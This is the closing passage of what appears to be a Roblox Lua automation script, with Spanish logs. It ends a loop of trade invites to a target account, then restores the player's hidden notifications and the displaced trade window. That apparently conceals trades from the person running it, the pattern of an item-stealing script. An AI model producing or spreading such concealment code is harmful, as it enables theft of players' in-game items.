                        log("ERROR", "SendInvite falló", err)
                    end
                else
                    log("WARN", "No hay items para tradear, no se envía invite")
                end
            end
        end

        task.wait(0.4)
    end

    log("WARN", "Bucle de tradeo finalizado. El objetivo se fue o el jugador se fue.")

    -- ==========================================
    -- RESTAURACIÓN FINAL
    -- ==========================================
    task.wait(0.5) 

    pcall(function()
        local pGui = player:WaitForChild("PlayerGui")
        if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
            pGui.Notifications.Body.Visible = true
        end
        if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
            if tradeGuiOriginal then
                pGui.NewGui.TradeNegotiation.Position = tradeGuiOriginal
            else
                pGui.NewGui.TradeNegotiation.Position = UDim2.new(0.5, -250, 0.5, -200) 
            end
        end
    end)
    log("OK", "🏁 GUI restaurada y script finalizado correctamente")
    
    -- Imprimir resumen final
    print("═══════════════════════════════════════")
    print("📊 RESUMEN DE EJECUCIÓN")
    print("═══════════════════════════════════════")
    print("Total logs generados: " .. #LOG_BUFFER)
    for _, entry in ipairs(LOG_BUFFER) do
        print(entry)
    end
end)
